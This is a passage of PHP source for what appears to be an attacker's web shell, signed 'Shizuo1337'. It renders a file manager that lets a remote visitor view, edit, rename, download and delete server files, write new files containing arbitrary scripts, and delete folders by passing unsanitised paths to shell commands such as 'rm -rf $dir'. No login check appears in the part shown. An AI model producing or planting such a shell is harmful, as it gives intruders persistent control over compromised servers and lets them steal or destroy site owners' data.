		echo '<strong>Rename file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Rename file</strong> FAIL! '.er().'</div>';
				}
			}
		}
		if($_7['action'] == 'rename') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."' $_r>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//delete file
		if ($_7['action'] == 'delete_file') {
		s();
		if ($_7['yeahx']) {
			$delete = unlink($file);
			if ($delete) {
		echo '<strong>Delete file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Delete file</strong> FAIL! '.er().'</div>';
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($file)." ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=$dir'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		//delete folder
		if ($_7['action'] == 'delete_folder' ) {
		s();
		if ($_7['yeah']) {
			if(is_dir($dir)) {
			if(is_writable($dir)) {
				@rmdir($dir);
				@exe("rm -rf $dir");
				@exe("rmdir /s /q $dir");
		echo '<strong>Delete folder</strong> OK! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				} else {
		echo '<strong>Delete folder</strong> FAIL! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-dark btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($dir)." ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=".dirname($dir)."'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		if(isset($_7['filenew'])) {
		s();
		if(isset($_7['bikin'])){
			$name = $_7['name_file'];
			$contents_file = $_7['contents_file'];
			foreach ($name as $name_file){
				$handle = @fopen("$name_file", "w");
				if($contents_file){
					$create = @fwrite($handle, $contents_file);
				} else {
					$create = $handle;
				}
			}
			if($create){
				echo "<script>window.location='?path=$path'</script>";
			} else {
				echo '<strong>Create file</strong> FAIL! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm text-dark' type='text' name='name_file[]' placeholder='filename' $_r>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control form-control-sm text-dark' name='contents_file' rows='7' placeholder='your script' $_r></textarea>
				<div class='d-grid gap-2'><br>
					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Create'>
				</div>
			</form>
		</div>";
		}
		if(isset($_7['dirnew'])) {
		s();
		if(isset($_7['create'])){
			$name = $_7['name_dir'];
			foreach ($name as $name_dir){
				$folder = preg_replace("([^wsd-_~,;:[](].]|[.]{2,})", '', $name_dir);
				$fd = @mkdir ($folder);
			}
			if($fd){
				echo "<script>window.location='?path=$path'</script>";
			} else {
				echo '<strong>Create dir</strong> FAIL! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory name:
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm text-dark' type='text' name='name_dir[]' placeholder='Dir name' $_r>
					<input class='btn btn-outline-light btn-sm' type='submit' name='create' value='Create Directory'>
				</div>
			</form>
		</div>";
		}
		echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">Name</td>
				<td class="text-center">Type</td>
				<td class="text-center">Last Edit</td>
				<td class="text-center">Size</td>
				<td class="text-center">Owner<gr>/</gr>Group</td>
				<td class="text-center">Permission</td>
			<td class="text-center">Action</td>
		</tr>
		</thead>
		<tbody class="text-nowrap">
		<tr>
			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
					<a class="btn btn-outline-light btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
				</div>
			</td>
		</tr>';		
		foreach($scand as $dir){
			$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
			if(strlen($dir) > 25) {
				$_d = substr($dir, 0, 25)."...";		
			}else{
				$_d = $dir;
			}
			if(function_exists('posix_getpwuid')) {
				$downer = @posix_getpwuid(fileowner("$path/$dir"));
				$downer = $downer['name'];
			} else {
				$downer = fileowner("$path/$dir");
			}
			if(function_exists('posix_getgrgid')) {
				$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
				$dgrp = $dgrp['name'];
			} else {
				$dgrp = filegroup("$path/$dir");
			}
			if(!is_dir($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			}else{
				$size = $size.' KB';
			}
		if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
		echo "
		<tr>
			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?dir=$path/$dir'>$_d</a></td>
			<td class='text-center'>dir</td>
			<td class='text-center'>$dt</td>
			<td class='text-center'>-</td>
			<td class='text-center'>$downer<gr>/</gr>$dgrp</td>
			<td class='text-center'>";
				if(is_writable($path.'/'.$dir)) echo '<gr>';
					elseif(!is_readable($path.'/'.$dir)) echo '<rd>';
				echo p($path.'/'.$dir);
				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
		echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
				<a class='btn btn-outline-danger btn-sm txt' href='?dir=$path/$dir&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
		}
		foreach($scand as $file){
			$ft = date("Y-m-d G:i", filemtime("$path/$file"));
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$path/$file"));
				$fowner = $fowner['name'];
			} else {
				$fowner = fileowner("$path/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$path/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$path/$file");
			}
			if(!is_file($path.'/'.$file)) continue;
			if(strlen($file) > 25) {
				$_f = substr($file, 0, 25)."...-.".$ext;		
			}else{
				$_f = $file;
			}
		echo "
		<tr>
		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=$path&action=view&opn=$file'>$_f</a></td>
			<td class='text-center'>file</td>
			<td class='text-center'>$ft</td>
			<td class='text-center'>".sz(filesize($file))."</td>
			<td class='text-center'>$fowner<gr>/</gr>$fgrp</td>
			<td class='text-center'>";
			if(is_writable($path.'/'.$file)) echo '<gr>';
			elseif(!is_readable($path.'/'.$file)) echo '<rd>';
				echo p($path.'/'.$file);
			if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</gr></rd></td>';
			echo "
			<td class='text-center'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
				<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
		}
		?>
		</tbody>
		</table>
		</div><center><div class='text-secondary'><hr><font color=white>&copy; Shizuo1337</font></div></center>
	</div>
</div>
</body>
</html>
